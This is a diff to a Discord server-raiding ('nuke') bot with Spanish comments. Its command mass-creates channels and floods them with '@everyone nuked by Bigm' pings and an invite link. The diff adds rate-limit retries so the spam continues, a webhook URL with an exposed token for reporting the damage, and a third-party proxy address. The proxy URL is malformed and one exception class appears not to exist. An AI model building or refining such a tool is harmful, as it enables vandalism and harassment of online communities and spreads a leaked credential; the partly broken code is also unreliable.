@@ -4,7 +4,7 @@ import random
 import asyncio
 import time
 import os
-import requests
+import aiohttp
 
 # --- CONFIGURACIÓN DE INTENTOS ---
 intents = discord.Intents.default()
@@ -13,7 +13,7 @@ intents.guild_messages = True
 intents.message_content = True
 intents.members = True
 
-bot = commands.Bot(command_prefix='!', intents=intents)
+bot = commands.Bot(command_prefix='.', intents=intents)
 
 print("El arma está cargada y lista para el lanzamiento.")
 
@@ -26,9 +26,13 @@ channel_names = [
 TARGET_CHANNELS = 100
 TARGET_PINGS = 1000
 CONCURRENCY_LIMIT = 25
-LOG_CHANNEL_NAME = "server-damage-log"
-WEBHOOK_URL = "TU_WEBHOOK_AQUI"   # <-- cámbialo si quieres
-MESSAGE_TO_MEMBERS = "You have been invaded by voidxn"
+LOG_CHANNEL_NAME = "﹗logs"
+WEBHOOK_URL = "https://discord.com/api/webhooks/1438649141851979776/p8c52p4cNv7SGBXkz0L_liPgD2_3D5p2TjDZfQTRTGAH2FyNO452lUHmqIAyrG4m0cyp"  # <-- cámbialo si quieres
+MESSAGE_TO_MEMBER = "You have been invaded by voidxn"
+
+# Configuración del proxy
+PROXY_URL = "http//:138.201.245.91:8080"  # Reemplaza con tu proxy
+# Ejemplo: PROXY_URL = "http://108.162.192.113"
 
 semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
 
@@ -83,9 +87,12 @@ async def send_embed_via_webhook(guild, ctx, start_time, duration):
         }]
     }
     try:
-        requests.post(WEBHOOK_URL, json=data)
-    except:
-        pass
+        async with aiohttp.ClientSession() as session:
+            async with session.post(WEBHOOK_URL, json=data, proxy=PROXY_URL) as response:
+                if response.status != 204:
+                    print(f"Error al enviar webhook: {response.status}")
+    except Exception as e:
+        print(f"Error al enviar webhook: {e}")
 
 @bot.command(name='nuke')
 @commands.has_permissions(administrator=True)
@@ -103,9 +110,14 @@ async def create_and_delete_channels(ctx):
                 name = random.choice(channel_names)
                 ch = await ctx.guild.create_text_channel(f'{name}-{i}')
                 for _ in range(TARGET_PINGS // TARGET_CHANNELS):
-                    await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')
-            except:
-                pass
+                    try:
+                        await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')
+                    except discord.errors.RateLimitError as e:
+                        print(f"RateLimitError: Esperando {e.retry_after} segundos.")
+                        await asyncio.sleep(e.retry_after)
+                        await ch.send('@everyone nuked by Bigm https://discord.gg/Duhk3RTsfA')  # Reintenta enviar
+            except Exception as e:
+                print(f"Error al crear/enviar mensaje: {e}")
 
     tasks = [create_and_ping(i) for i in range(1, TARGET_CHANNELS + 1)]
     await asyncio.gather(*tasks, return_exceptions=True)
